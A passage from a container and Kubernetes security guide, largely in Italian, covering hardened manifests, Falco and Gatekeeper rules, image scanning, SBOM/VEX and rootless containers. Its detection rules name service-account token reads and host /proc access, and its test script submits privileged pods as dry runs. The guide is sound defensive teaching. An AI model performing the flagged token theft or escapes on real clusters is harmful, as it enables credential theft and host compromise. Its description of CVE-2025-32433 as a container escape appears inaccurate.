# hardened-deployment.yaml — Same app, properly secured

apiVersion: v1
kind: Namespace
metadata:
  name: production-hardened
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest

---
# Minimal ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa-hardened
  namespace: production-hardened
automountServiceAccountToken: false

---
# Minimal RBAC — only what the app actually needs
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production-hardened
  name: app-role-minimal
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  resourceNames: ["app-config"]  # Only specific configmap
  verbs: ["get"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-binding-hardened
  namespace: production-hardened
subjects:
- kind: ServiceAccount
  name: app-sa-hardened
  namespace: production-hardened
roleRef:
  kind: Role
  name: app-role-minimal
  apiGroup: rbac.authorization.k8s.io

---
# Network Policy — deny all, allow only required
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: app-netpol
  namespace: production-hardened
spec:
  podSelector:
    matchLabels:
      app: hardened-app
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: ingress-gateway
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: database
    ports:
    - protocol: TCP
      port: 5432
  - to:  # DNS
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53

---
# Hardened Deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hardened-app
  namespace: production-hardened
spec:
  replicas: 2
  selector:
    matchLabels:
      app: hardened-app
  template:
    metadata:
      labels:
        app: hardened-app
    spec:
      serviceAccountName: app-sa-hardened
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 65534
        runAsGroup: 65534
        fsGroup: 65534
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: app
        image: myregistry.io/app:v1.2.3@sha256:abc123def456...
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop: ["ALL"]
        ports:
        - containerPort: 8080
          protocol: TCP
        resources:
          limits:
            memory: "512Mi"
            cpu: "1000m"
            ephemeral-storage: "100Mi"
          requests:
            memory: "256Mi"
            cpu: "250m"
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 10
          periodSeconds: 30
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 10
        volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: secrets
          mountPath: /mnt/secrets
          readOnly: true
      volumes:
      - name: tmp
        emptyDir:
          medium: Memory
          sizeLimit: 64Mi
      - name: secrets
        csi:
          driver: secrets-store.csi.k8s.io
          readOnly: true
          volumeAttributes:
            secretProviderClass: vault-app-secrets
```

### Phase 5: Detection Rules for the Attack

```yaml
# falco-lab-rules.yaml — Detect the attack scenario

- rule: Service Account Token Read
  desc: Detect reading of service account token (normal for some apps, suspicious for others)
  condition: >
    open_read and
    container and
    fd.name = "/var/run/secrets/kubernetes.io/serviceaccount/token" and
    not proc.name in (kubelet, coredns)
  output: >
    SA token read (container=%container.name image=%container.image.repository
    process=%proc.name command=%proc.cmdline)
  priority: NOTICE

- rule: Kubectl or Curl to API Server
  desc: Detect direct API server access from within containers
  condition: >
    evt.type=connect and
    container and
    fd.sip="10.96.0.1" and
    fd.sport=443 and
    not k8s.ns.name in (kube-system, monitoring)
  output: >
    API server access from container (container=%container.name
    namespace=%k8s.ns.name process=%proc.name command=%proc.cmdline)
  priority: WARNING

- rule: Host Proc Access from Container
  desc: Detect reading host proc filesystem from container
  condition: >
    open_read and
    container and
    fd.name startswith "/host/proc"
  output: >
    Host proc access (container=%container.name file=%fd.name
    process=%proc.name command=%proc.cmdline)
  priority: CRITICAL

- rule: Package Manager Execution in Production
  desc: Detect apt/yum/apk execution in production containers
  condition: >
    spawned_process and
    container and
    proc.name in (apt, apt-get, yum, dnf, apk, pip, pip3, npm) and
    k8s.ns.name = "production"
  output: >
    Package manager in production (container=%container.name
    process=%proc.name command=%proc.cmdline)
  priority: WARNING
```

### Phase 6: Gatekeeper Policies for Prevention

```yaml
# Prevent hostPath volumes
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenyhostpath
spec:
  crd:
    spec:
      names:
        kind: K8sDenyHostPath
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sdenyhostpath

      violation[{"msg": msg}] {
        volume := input.review.object.spec.volumes[_]
        volume.hostPath
        msg := sprintf("HostPath volume '%v' is not allowed. Use emptyDir, PVC, or CSI volumes.",
                       [volume.name])
      }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sDenyHostPath
metadata:
  name: deny-hostpath-production
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    - apiGroups: ["apps"]
      kinds: ["Deployment", "StatefulSet", "DaemonSet"]
    namespaces: ["production", "production-hardened"]

---
# Prevent privileged containers
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenyprivileged
spec:
  crd:
    spec:
      names:
        kind: K8sDenyPrivileged
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sdenyprivileged

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        container.securityContext.privileged == true
        msg := sprintf("Privileged container '%v' is not allowed.", [container.name])
      }

      violation[{"msg": msg}] {
        container := input.review.object.spec.initContainers[_]
        container.securityContext.privileged == true
        msg := sprintf("Privileged init container '%v' is not allowed.", [container.name])
      }

      violation[{"msg": msg}] {
        input.review.object.spec.hostPID == true
        msg := "hostPID is not allowed."
      }

      violation[{"msg": msg}] {
        input.review.object.spec.hostNetwork == true
        msg := "hostNetwork is not allowed."
      }

      violation[{"msg": msg}] {
        input.review.object.spec.hostIPC == true
        msg := "hostIPC is not allowed."
      }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sDenyPrivileged
metadata:
  name: deny-privileged-production
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    namespaces: ["production", "production-hardened", "staging"]

---
# Require resource limits
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequireresourcelimits
spec:
  crd:
    spec:
      names:
        kind: K8sRequireResourceLimits
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequireresourcelimits

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not container.resources.limits.memory
        msg := sprintf("Container '%v' must have memory limits set.", [container.name])
      }

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not container.resources.limits.cpu
        msg := sprintf("Container '%v' must have CPU limits set.", [container.name])
      }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireResourceLimits
metadata:
  name: require-limits-production
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    namespaces: ["production", "production-hardened"]
```

### Verification Checklist — Lab Completion

After completing the lab, verify each defensive control:

```bash
#!/bin/bash
# verify-lab.sh — Validate security controls are effective

echo "=== Container Security Lab Verification ==="
echo ""

echo "[1] Pod Security Standards"
kubectl get ns production-hardened -o jsonpath='{.metadata.labels}' | jq .
# Should show: pod-security.kubernetes.io/enforce: restricted

echo ""
echo "[2] Gatekeeper Constraints Active"
kubectl get constraints
# Should show multiple constraints with enforcementAction: deny

echo ""
echo "[3] Network Policies Applied"
kubectl get networkpolicy -n production-hardened
# Should show deny-all and specific allow rules

echo ""
echo "[4] Falco Running"
kubectl get pods -n falco-system
kubectl logs -l app.kubernetes.io/name=falco -n falco-system --tail=5

echo ""
echo "[5] Trivy Operator Scanning"
kubectl get vulnerabilityreports -n production-hardened
kubectl get vulnerabilityreports -n production-hardened -o json | \
  jq '.items[].report.summary'

echo ""
echo "[6] Test: Privileged Pod Should Be Denied"
kubectl run test-privileged --image=ubuntu \
  --namespace=production-hardened \
  --overrides='{"spec":{"containers":[{"name":"test","image":"ubuntu","securityContext":{"privileged":true}}]}}' \
  --dry-run=server 2>&1 | grep -i "denied\|forbidden\|violated"

echo ""
echo "[7] Test: HostPath Volume Should Be Denied"
kubectl apply --dry-run=server -f - <<EOF 2>&1 | grep -i "denied\|forbidden\|violated"
apiVersion: v1
kind: Pod
metadata:
  name: test-hostpath
  namespace: production-hardened
spec:
  containers:
  - name: test
    image: ubuntu
  volumes:
  - name: host
    hostPath:
      path: /etc
EOF

echo ""
echo "[8] Test: Unsigned Image Should Be Rejected (Kyverno)"
kubectl run test-unsigned --image=docker.io/library/nginx:latest \
  --namespace=production-hardened \
  --dry-run=server 2>&1 | grep -i "denied\|failed\|violated"

echo ""
echo "[9] ServiceAccount Token Not Auto-Mounted"
kubectl get pod -n production-hardened -o json | \
  jq '.items[].spec.automountServiceAccountToken'
# Should show: false

echo ""
echo "[10] All Containers Non-Root"
kubectl get pods -n production-hardened -o json | \
  jq '.items[].spec.containers[].securityContext.runAsNonRoot'
# Should all show: true

echo ""
echo "=== Verification Complete ==="
```

---

## 11. Analisi Avanzata delle Immagini e Dockerfile Hardening

### 11.1 Evoluzione delle Immagini Base Sicure

La scelta dell'immagine base rappresenta la decisione di sicurezza più impattante nella containerizzazione. Le immagini tradizionali (Ubuntu, Debian, Alpine) contengono centinaia di pacchetti non necessari per l'applicazione, ciascuno con potenziali vulnerabilità. L'evoluzione verso immagini minimali ha prodotto tre approcci dominanti.

#### Distroless Images (Google)

Le immagini distroless di Google eliminano package manager, shell, e utility di sistema. Contengono esclusivamente l'applicazione, le sue dipendenze runtime, e i certificati CA. Questo approccio riduce drasticamente la superficie d'attacco: un'immagine distroless tipica contiene meno di 20 pacchetti contro le centinaia di un'immagine base tradizionale.

```dockerfile
# Multi-stage build con distroless
FROM golang:1.23-bookworm AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download && go mod verify
COPY . .
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
    go build -ldflags="-w -s -X main.version=$(git describe --tags)" \
    -trimpath -o /app/server ./cmd/server

# Immagine finale distroless — nessuna shell, nessun package manager
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /app/server /server
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
USER 65534:65534
ENTRYPOINT ["/server"]
```

Il vantaggio critico: senza shell disponibile, un attaccante che ottiene RCE (Remote Code Execution) non può eseguire comandi arbitrari nel container, interrompendo la maggior parte delle kill chain documentate nel MITRE ATT&CK Container Matrix.

#### Chainguard Images e Wolfi

Chainguard ha introdotto un approccio radicalmente diverso con il progetto Wolfi, una distribuzione Linux progettata specificamente per i container. A differenza di Alpine (musl-based), Wolfi utilizza glibc, garantendo compatibilità con l'ecosistema software mainstream. La distribuzione mantiene oltre 2.000 immagini con zero CVE note al momento del rilascio.

```dockerfile
# Immagine Python basata su Chainguard
FROM cgr.dev/chainguard/python:latest-dev AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir --prefix=/install -r requirements.txt

FROM cgr.dev/chainguard/python:latest
WORKDIR /app
COPY --from=builder /install /usr/local
COPY . .
USER nonroot
ENTRYPOINT ["python", "-m", "uvicorn", "main:app", "--host", "0.0.0.0"]
```

Caratteristiche chiave di Chainguard:
- **Provenance SLSA Build Level 3**: ogni immagine include attestazioni di build verificabili
- **SBOM integrato**: ogni immagine pubblica un SBOM in formato SPDX automaticamente
- **Aggiornamenti giornalieri**: patch di sicurezza applicate entro 24 ore dalla pubblicazione dell'advisory
- **Varianti `-dev`**: includono shell e package manager per il build stage, la variante runtime li esclude

#### Confronto delle Immagini Base

| Caratteristica | Ubuntu 24.04 | Alpine 3.21 | Distroless | Chainguard |
|---|---|---|---|---|
| Dimensione base | ~78 MB | ~7 MB | ~2-20 MB | ~5-25 MB |
| CVE tipiche (new release) | 50-150 | 5-20 | 0-3 | 0 |
| Shell presente | Si | Si | No | No (runtime) |
| Package manager | apt | apk | No | No (runtime) |
| Libreria C | glibc | musl | glibc | glibc |
| SBOM integrato | No | No | No | Si |
| Firma cosign | No | No | Si | Si |
| Supporto non-root | Manuale | Manuale | Default | Default |

### 11.2 Dockerfile Linting con Hadolint

Hadolint è un linter per Dockerfile scritto in Haskell che esegue analisi AST (Abstract Syntax Tree) del Dockerfile e integra ShellCheck per validare i comandi shell embedded. Ogni regola è mappata a un identificativo DL (Dockerfile Lint) e produce warning, errori, o informazioni.

```bash
# Installazione e utilizzo base
hadolint Dockerfile

# Output con formato SARIF per integrazione CI
hadolint --format sarif Dockerfile > hadolint-results.sarif

# Ignorare regole specifiche inline
# hadolint ignore=DL3008,DL3009
RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates=20240203 \
    && rm -rf /var/lib/apt/lists/*

# Configurazione .hadolint.yaml
```

```yaml
# .hadolint.yaml — configurazione progetto
ignored:
  - DL3007  # Permetti :latest in dev (bloccato in CI per prod)

override:
  error:
    - DL3000  # WORKDIR deve essere assoluto
    - DL3001  # Non usare comandi inutili (ssh, vim)
    - DL3002  # Non impostare USER root come ultimo USER
    - DL3003  # Usa WORKDIR non cd
    - DL3004  # Non usare sudo
    - DL3006  # Specifica sempre il tag dell'immagine
    - DL3008  # Pin versioni in apt-get install
    - DL3009  # Rimuovi apt lists dopo install
    - DL3018  # Pin versioni in apk add
    - DL3025  # Usa JSON notation per CMD
    - DL3029  # Non usare --platform senza necessità
    - DL4006  # Imposta SHELL per pipeline failure detection
  warning:
    - DL3042  # Evita cache pip nel build
    - DL3059  # Consolida RUN multipli
  info:
    - DL3015  # Evita install-recommends
    - DL3028  # Preferisci ADD per URL

trustedRegistries:
  - gcr.io/distroless
  - cgr.dev/chainguard
  - docker.io/library
```

Regole critiche di Hadolint che prevengono vulnerabilità:

| Regola | Descrizione | Impatto Sicurezza |
|---|---|---|
| DL3002 | Last USER non deve essere root | Privilege escalation prevention |
| DL3004 | No sudo in Dockerfile | Elimina SUID binary risk |
| DL3006 | No :latest tag | Supply chain reproducibility |
| DL3008/DL3018 | Pin package versions | Supply chain integrity |
| DL3000 | WORKDIR path assoluto | Path traversal prevention |
| DL4006 | Set SHELL pipeline | Build failure detection |
| DL3029 | Platform consistency | Cross-arch supply chain |

### 11.3 Dockle — CIS Benchmark per Immagini

Dockle complementa Hadolint operando sull'immagine già costruita piuttosto che sul Dockerfile sorgente. Verifica conformità al CIS Docker Benchmark e identifica problemi non visibili a livello di Dockerfile come credenziali embedded, setuid binaries, e configurazioni di filesystem.

```bash
# Scan di un'immagine locale
dockle --exit-code 1 --exit-level fatal myapp:latest

# Output JSON per pipeline CI
dockle -f json -o dockle-results.json myapp:latest

# Ignorare check specifici
dockle --ignore CIS-DI-0001 --ignore DKL-DI-0006 myapp:latest
```

Checkpoint principali di Dockle:

```
CIS-DI-0001  Create a user for the container
CIS-DI-0002  Use trusted base images
CIS-DI-0003  Do not install unnecessary packages
CIS-DI-0005  Enable Content Trust
CIS-DI-0006  Add HEALTHCHECK instruction
CIS-DI-0008  Confirm safety of setuid/setgid files
CIS-DI-0010  Do not store secrets in Dockerfile
DKL-DI-0001  Avoid latest tag
DKL-DI-0002  Avoid sensitive directory mounting
DKL-DI-0003  Avoid credential files
DKL-DI-0004  Avoid sudo command
DKL-DI-0005  Clear apt/apk cache
DKL-DI-0006  Avoid dist-upgrade
DKL-LI-0001  Avoid empty password
DKL-LI-0002  Be unique UID/GID
```

### 11.4 Confronto Scanner di Vulnerabilità

Tre scanner dominano il panorama enterprise: Trivy (Aqua Security), Grype (Anchore), e Snyk Container. Ciascuno ha punti di forza e architetture diverse.

#### Trivy — Scanner Universale

Trivy è lo scanner più versatile, capace di analizzare immagini container, filesystem, repository Git, configurazioni IaC (Terraform, CloudFormation, Kubernetes manifests), e SBOM. Utilizza database di vulnerabilità aggregati da NVD, Red Hat, Debian, Ubuntu, Alpine, e advisory vendor-specifici.

```bash
# Scan completo con SBOM generation
trivy image --severity HIGH,CRITICAL \
  --scanners vuln,secret,misconfig \
  --format json \
  --output trivy-report.json \
  myregistry.io/app:v2.1.0

# Scan con VEX filtering (ignora vulnerabilità non applicabili)
trivy image --vex openvex.json \
  --show-suppressed \
  myregistry.io/app:v2.1.0

# Scan filesystem locale durante sviluppo
trivy fs --scanners vuln,secret,misconfig .

# Generazione SBOM in formato CycloneDX
trivy image --format cyclonedx \
  --output sbom-cyclonedx.json \
  myregistry.io/app:v2.1.0

# Scan configurazione Kubernetes
trivy k8s --report summary cluster
```

#### Grype — Specializzato in Vulnerabilità

Grype è focalizzato esclusivamente sulla vulnerability detection nelle immagini container. Si integra nativamente con Syft per la generazione SBOM e offre performance eccellenti su immagini di grandi dimensioni.

```bash
# Scan con fail threshold
grype myregistry.io/app:v2.1.0 --fail-on high

# Output SARIF per GitHub Advanced Security
grype myregistry.io/app:v2.1.0 -o sarif > grype-results.sarif

# Scan da SBOM pre-generato (più veloce)
syft myregistry.io/app:v2.1.0 -o spdx-json > sbom.json
grype sbom:sbom.json --fail-on critical

# Configurazione .grype.yaml
```

```yaml
# .grype.yaml
check-for-app-update: false
fail-on-severity: high
output: "table"
scope: "squashed"
quiet: false
db:
  auto-update: true
  cache-dir: ".cache/grype/db"
  max-allowed-built-age: 120h
ignore:
  # CVE non applicabile — validato con VEX analysis
  - vulnerability: CVE-2024-12345
    reason: "Package not reachable in runtime context"
  # Fix non disponibile — compensating control in place
  - vulnerability: CVE-2025-67890
    fix-state: not-fixed
    reason: "WAF rule deployed as compensating control"
match:
  java:
    using-cpes: false  # Riduce falsi positivi per Java
```

#### Snyk Container — Context-Aware Analysis

Snyk Container si differenzia per l'analisi context-aware: non si limita a identificare CVE presenti nell'immagine, ma valuta se la vulnerabilità è effettivamente raggiungibile dal codice applicativo (reachability analysis). Questa capacità riduce drasticamente i falsi positivi, tipicamente del 60-80%.

```bash
# Scan con base image recommendations
snyk container test myregistry.io/app:v2.1.0 \
  --severity-threshold=high \
  --file=Dockerfile \
  --json > snyk-results.json

# Monitor continuo (registra per alerting)
snyk container monitor myregistry.io/app:v2.1.0 \
  --org=my-org \
  --project-name=production-app
```

#### Matrice Comparativa Scanner

| Funzionalità | Trivy | Grype | Snyk Container |
|---|---|---|---|
| Licenza | Apache 2.0 | Apache 2.0 | Proprietary (free tier) |
| Reachability analysis | No | No | Si |
| IaC scanning | Si | No | Si (separato) |
| Secret detection | Si | No | No |
| SBOM generation | Si (CycloneDX, SPDX) | Via Syft | Si |
| VEX support | Si (OpenVEX, CSAF) | Parziale | Interno |
| CI/CD integration | Nativo | Nativo | Nativo + SaaS |
| Kubernetes operator | Si (Trivy Operator) | No | Si (Snyk Controller) |
| Performance (1GB image) | ~45s | ~30s | ~60s |
| Database update | OCI registry pull | OCI registry pull | SaaS managed |
| SARIF output | Si | Si | Si |
| Base image suggestion | Parziale | No | Si |

### 11.5 SBOM e VEX — Gestione del Rumore nelle Vulnerabilità

#### Software Bill of Materials (SBOM)

L'SBOM elenca ogni componente software presente in un'immagine container. Due formati standard dominano: SPDX (Linux Foundation) e CycloneDX (OWASP). La generazione SBOM è diventata requisito federale negli Stati Uniti (Executive Order 14028) e sta diventando standard in Europa con il Cyber Resilience Act.

```bash
# Generazione SBOM con Syft — formato SPDX
syft myregistry.io/app:v2.1.0 -o spdx-json=sbom-spdx.json

# Generazione SBOM con Syft — formato CycloneDX
syft myregistry.io/app:v2.1.0 -o cyclonedx-json=sbom-cdx.json

# Attach SBOM all'immagine OCI come attestazione
cosign attest --predicate sbom-cdx.json \
  --type cyclonedx \
  myregistry.io/app:v2.1.0

# Verifica attestazione SBOM
cosign verify-attestation \
  --type cyclonedx \
  myregistry.io/app:v2.1.0
```

#### Vulnerability Exploitability eXchange (VEX)

VEX risolve il problema dei falsi positivi negli scanner. Un documento VEX dichiara lo stato di exploitability di una vulnerabilità nel contesto specifico di un prodotto. Gli stati possibili sono: `not_affected`, `affected`, `fixed`, `under_investigation`.

```json
{
  "@context": "https://openvex.dev/ns/v0.2.0",
  "@id": "https://mycompany.com/vex/2026-05-24-001",
  "author": "security@mycompany.com",
  "timestamp": "2026-05-24T10:00:00Z",
  "statements": [
    {
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2025-32433",
        "name": "CVE-2025-32433"
      },
      "products": [
        {
          "@id": "pkg:oci/app@sha256:abc123..."
        }
      ],
      "status": "not_affected",
      "justification": "vulnerable_code_not_in_execute_path",
      "impact_statement": "The vulnerable Erlang SSH server component is not compiled into our application. We use a Go binary with no Erlang dependencies."
    },
    {
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2024-45678",
        "name": "CVE-2024-45678"
      },
      "products": [
        {
          "@id": "pkg:oci/app@sha256:abc123..."
        }
      ],
      "status": "affected",
      "action_statement": "Update to version >= 2.1.1 which patches the vulnerability",
      "action_statement_timestamp": "2026-05-30T00:00:00Z"
    }
  ]
}
```

Workflow operativo VEX integrato nella pipeline:

```bash
# 1. Scan iniziale
trivy image myregistry.io/app:v2.1.0 -o json > raw-scan.json

# 2. Conta vulnerabilità senza VEX
cat raw-scan.json | jq '[.Results[].Vulnerabilities[]? | select(.Severity == "HIGH" or .Severity == "CRITICAL")] | length'
# Output: 47

# 3. Applica VEX document
trivy image --vex openvex.json myregistry.io/app:v2.1.0 -o json > filtered-scan.json

# 4. Conta vulnerabilità con VEX — riduzione tipica 60-80%
cat filtered-scan.json | jq '[.Results[].Vulnerabilities[]? | select(.Severity == "HIGH" or .Severity == "CRITICAL")] | length'
# Output: 9

# 5. Le 9 rimanenti richiedono azione effettiva
```

### 11.6 Dockerfile Hardening Completo — Pattern Produzione

```dockerfile
# syntax=docker/dockerfile:1.12
# ===================================================================
# Production Hardened Dockerfile — Node.js Application
# Compliance: CIS Docker Benchmark v1.7, NIST SP 800-190
# ===================================================================

# --- Stage 1: Dependencies ---
FROM node:22-bookworm-slim AS deps
WORKDIR /app
# Copia solo i file di lock per cache layer ottimizzata
COPY package.json package-lock.json ./
# DL3016: Pin npm version | DL3042: No cache
RUN npm ci --ignore-scripts --no-audit --no-fund \
    && npm cache clean --force

# --- Stage 2: Build ---
FROM node:22-bookworm-slim AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
# Build dell'applicazione
RUN npm run build \
    && npm prune --production \
    && rm -rf src/ test/ .git/ .env* *.md tsconfig.json

# --- Stage 3: Production Runtime ---
FROM gcr.io/distroless/nodejs22-debian12:nonroot AS runtime

# Metadata OCI standard
LABEL org.opencontainers.image.title="myapp" \
      org.opencontainers.image.version="2.1.0" \
      org.opencontainers.image.vendor="MyCompany" \
      org.opencontainers.image.source="https://github.com/mycompany/myapp" \
      org.opencontainers.image.licenses="MIT"

WORKDIR /app

# Copia solo artifacts necessari dal builder
COPY --from=builder --chown=65534:65534 /app/dist ./dist
COPY --from=builder --chown=65534:65534 /app/node_modules ./node_modules
COPY --from=builder --chown=65534:65534 /app/package.json ./

# Porta applicativa non-privilegiata
EXPOSE 8080

# Healthcheck per orchestrator
HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
  CMD ["/nodejs/bin/node", "-e", \
  "const h=require('http');const r=h.request({hostname:'localhost',port:8080,path:'/healthz',timeout:3000},s=>{process.exit(s.statusCode===200?0:1)});r.on('error',()=>process.exit(1));r.end()"]

# CIS-DI-0001: Run as non-root user
USER 65534:65534

# CIS-DI-0006: Use exec form for signal handling
ENTRYPOINT ["/nodejs/bin/node"]
CMD ["dist/server.js"]
```

---

## 12. Container Rootless e User Namespaces

### 12.1 Il Problema del Root nei Container

Per default, i processi dentro un container Linux eseguono come root (UID 0). Sebbene i Linux namespaces isolino il container dal host, il kernel sottostante è condiviso. Una vulnerabilità di container escape (come CVE-2024-21626 nel runtime runc, o CVE-2025-32433 in Erlang SSH) permette al processo root del container di ottenere root sull'host. Le statistiche del 2025 mostrano che il 40% delle compromissioni container sfruttano l'esecuzione come root.

Tre approcci complementari mitigano questo rischio:
1. **USER instruction nel Dockerfile** — il processo applicativo esegue come utente non-privilegiato
2. **Rootless container runtime** — il daemon container stesso esegue senza root
3. **User namespaces** — il UID 0 nel container mappa a un UID non-privilegiato sull'host

### 12.2 Podman Rootless

Podman è stato progettato fin dall'inizio per l'esecuzione rootless, senza daemon (daemonless architecture). Ogni container è un processo figlio diretto dell'utente che lo ha avviato, eliminando il single point of compromise rappresentato dal Docker daemon (che richiede root).

```bash
# Installazione Podman su Debian/Ubuntu
sudo apt-get install -y podman slirp4netns fuse-overlayfs

# Verifica configurazione subordinate UID/GID
cat /etc/subuid
# renan:100000:65536

cat /etc/subgid
# renan:100000:65536

# Esecuzione container rootless — nessun sudo necessario
podman run --rm -it \
  --security-opt no-new-privileges:true \
  --cap-drop ALL \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
  docker.io/library/python:3.13-slim \
  python -c "import os; print(f'UID inside: {os.getuid()}, PID: {os.getpid()}')"

# Verifica mapping UID dall'host
podman top $(podman ps -q) user huser
# USER    HUSER
# root    renan    ← UID 0 nel container = utente non-root sull'host

# Build rootless
podman build --layers --squash-all -t myapp:v1 .

# Pod rootless (simula Kubernetes Pod)
podman pod create --name myapp-pod -p 8080:8080
podman run -d --pod myapp-pod --name app myapp:v1
podman run -d --pod myapp-pod --name sidecar envoyproxy/envoy:v1.32
```

Architettura Podman rootless:
- **slirp4netns / pasta**: networking in userspace, nessun bridge privilegiato
- **fuse-overlayfs**: storage driver che opera senza root
- **crun**: OCI runtime scritto in C, supporto nativo user namespaces
- **conmon**: container monitor leggero, un processo per container
- Nessun daemon in background — zero attack surface quando nessun container è in esecuzione

### 12.3 Docker Rootless Mode

Docker supporta la modalità rootless dal v20.10. Il daemon dockerd e containerd eseguono nello user namespace dell'utente non-privilegiato.

```bash
# Installazione Docker rootless
dockerd-rootless-setuptool.sh install

# Configurazione environment
export PATH=$HOME/bin:$PATH
export DOCKER_HOST=unix://$XDG_RUNTIME_DIR/docker.sock

# Verifica
docker info 2>/dev/null | grep -i "root\|security\|context"
# Security Options: seccomp, rootless
# Context: rootless

# Limitazioni Docker rootless:
# - No --privileged containers
# - No --net=host (usa slirp4netns o pasta)
# - AppArmor non disponibile (usare seccomp)
# - Porte < 1024 richiedono sysctl o setcap
# - cgroup v2 richiesto per resource limits

# Abilitare porte privilegiate (opzionale, richiede sysctl)
sudo sysctl -w net.ipv4.ip_unprivileged_port_start=80
```

### 12.4 User Namespaces in Kubernetes

La funzionalità user namespaces in Kubernetes è il meccanismo più importante per la sicurezza dei container negli ultimi anni. Permette di mappare UID/GID del container a range non-privilegiati sull'host, rendendo inefficaci gli attacchi di container escape anche quando il processo è root all'interno del container.

**Timeline di sviluppo:**
- Kubernetes 1.25 (2022): Alpha, feature gate `UserNamespacesStatelessPodsSupport`
- Kubernetes 1.28 (2023): Beta, `UserNamespacesSupport`
- Kubernetes 1.30 (2024): Beta avanzato, supporto Pod con volumi stateful
- Kubernetes 1.33 (2025): Default opt-in, il feature gate è abilitato di default
- Kubernetes 1.36 (Aprile 2026): **GA (Generally Available)**, feature gate rimosso

```yaml
# Pod con user namespaces — Kubernetes >= 1.30
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  hostUsers: false  # ← Abilita user namespaces
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: cgr.dev/chainguard/python:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        cpu: "500m"
        memory: "256Mi"
      requests:
        cpu: "100m"
        memory: "128Mi"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: data
      mountPath: /data
  volumes:
  - name: tmp
    emptyDir:
      sizeLimit: 64Mi
  - name: data
    persistentVolumeClaim:
      claimName: app-data
```

```bash
# Verifica user namespace mapping dall'host
kubectl debug node/worker-1 -it --image=busybox -- \
  cat /proc/$(pgrep -f "python")/uid_map
# Output:
#          0     100000      65536
# UID 0 nel container = UID 100000 sull'host (non-privilegiato)

# Verifica che il Pod usa user namespaces
kubectl get pod secure-app -o jsonpath='{.spec.hostUsers}'
# Output: false
```

#### Impatto sulla Sicurezza dei User Namespaces

| Scenario di Attacco | Senza User NS | Con User NS |
|---|---|---|
| Container escape via CVE-2024-21626 | Root sull'host | UID 100000 sull'host (non-privilegiato) |
| /etc/shadow leggibile dopo escape | Si | No (UID non ha permessi) |
| Kernel exploit dall'interno container | Root capabilities | No capabilities effettive |
| Volume mount attack | Read/write come root | Read/write come UID non-privilegiato |
| Host PID namespace access | Può killare processi host | Solo processi nello stesso user namespace |

### 12.5 Migrazione a Container Rootless — Strategia Operativa

La migrazione da container root a rootless richiede una strategia graduale per evitare interruzioni di servizio.

```bash
#!/bin/bash
# rootless-audit.sh — Identifica container che eseguono come root
# Esegui su ogni cluster per valutare lo stato corrente

echo "=== AUDIT: Container Running as Root ==="
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

# Conta container root vs non-root
TOTAL=$(kubectl get pods -A -o json | jq '[.items[].spec.containers[]] | length')
ROOT=$(kubectl get pods -A -o json | jq '[.items[].spec.containers[] | select(.securityContext.runAsNonRoot != true)] | length')
NONROOT=$((TOTAL - ROOT))

echo "Total containers: $TOTAL"
